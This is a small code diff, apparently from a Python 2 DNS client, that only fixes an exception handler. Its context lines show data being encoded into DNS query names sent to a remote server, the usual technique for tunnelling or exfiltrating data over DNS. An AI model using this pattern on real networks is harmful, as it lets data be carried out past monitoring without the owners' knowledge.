@@ -42,7 +42,7 @@ class Client:
                     id=15, opcode=0,
                     qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")],
                     verbose=False))
-            except gaierror:
+            except socket.gaierror:
                 pass
             except KeyboardInterrupt:
                 print "[*] Shutting down..."
